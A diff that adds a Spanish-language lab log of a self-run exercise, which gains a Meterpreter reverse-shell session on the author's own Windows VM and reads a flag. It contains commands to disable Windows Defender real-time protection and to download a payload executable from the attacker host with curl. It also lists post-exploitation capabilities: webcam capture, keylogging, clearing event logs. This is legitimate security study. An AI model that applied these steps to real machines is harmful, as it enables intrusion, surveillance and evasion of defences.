@@ -183,3 +183,52 @@ Lo que SI quedo demostrado/aprendido:
 
 Siguiente paso en: guion_que_sigue.txt  (montar red Host-Only Kali<->Windows).
 ===============================================================================
+
+===============================================================================
+ CONTINUACION 2026-10-05 (16:00 - 18:10 aprox)  ==>  RETO COMPLETADO ***
+===============================================================================
+Atacante final : BlackArch host directo (no VM) -> LHOST 192.168.1.20
+Victima        : VM Windows 11 -> 192.168.1.22 (usuario prueba_VM\prueba_Arch)
+
+RESUMEN: se consiguio la sesion Meterpreter y se leyo la flag. El bloqueo NUNCA
+fue de tecnica (msfvenom/handler ya funcionaban); eran 3 problemas de entorno en
+cadena. Se diagnosticaron por capas:
+
+  (1) RED - doble IP del host (cable .20 + wifi .19 en la misma subred) causaba
+      ruteo asimetrico: el ping (ICMP) pasaba pero el TCP de vuelta no completaba.
+      FIX: bajar el wifi (wlp9s0 DOWN) -> host con una sola IP .20. Se reuso el
+      payload original (LHOST no cambio, sigue 192.168.1.20).
+
+  (2) FIREWALL propio (nftables, 'table inet filter', policy drop). Solo aceptaba
+      entrada por tun0 (@htb_targets de la VPN HTB) + ICMP -> de ahi la firma
+      "ping si, TCP no". La VM entra por enp8s0, no por tun0 -> caia en el reject.
+      FIX (reglas temporales, viven en memoria):
+        sudo nft insert rule inet filter input iifname "enp8s0" \
+             ip saddr 192.168.1.22 tcp dport 4444 accept
+        (idem para 8000)
+      OJO: usar 'insert' (va al inicio, antes del reject), NO 'add' (va al final).
+      OJO zsh: las llaves { 4444, 8000 } dan parse error -> una regla por puerto.
+
+  (3) ANTIVIRUS - Windows Defender con Proteccion en tiempo real ON borro el
+      payload raw al instante (confirmado: lo detecto en vivo). FIX: desactivar
+      Proteccion en tiempo real (admin PowerShell: Set-MpPreference
+      -DisableRealtimeMonitoring $true; ojo Tamper Protection se apaga por GUI).
+      Re-descarga: curl http://192.168.1.20:8000/trampa.exe -o ...\trampa.exe
+
+CADENA FINAL QUE FUNCIONO:
+  - handler escuchando: Started reverse TCP handler on 192.168.1.20:4444
+  - Test-NetConnection 192.168.1.20 -Port 4444 -> TcpTestSucceeded: True (antes False)
+  - ejecutar trampa.exe en la Windows -> Meterpreter session opened
+  - post-explotacion: getuid (prueba_VM\prueba_Arch), pwd/cd/ls para navegar
+  - flag en C:\Users\prueba_Arch\Desktop\falg\flag.txt.txt -> cat -> leida ***
+
+NOTAS / APRENDIZAJES NUEVOS:
+  - getuid (meterpreter) != whoami (eso es shell nativa; usar 'shell' primero).
+  - mirar la columna Size del ls: un archivo de 0 bytes esta VACIO (la flag se
+    creo vacia al inicio; hubo que escribirle contenido).
+  - meterpreter tiene comandos propios (clear no existe -> clearev).
+  - post-explotacion incluye webcam_snap/record_mic/screenshot/keyscan: control
+    total del equipo. Razon de peso para AV activo y no ejecutar exe no confiables.
+
+RESULTADO: COMPLETADO. Toda la cadena ofensiva + sesion + lectura de flag.
+===============================================================================
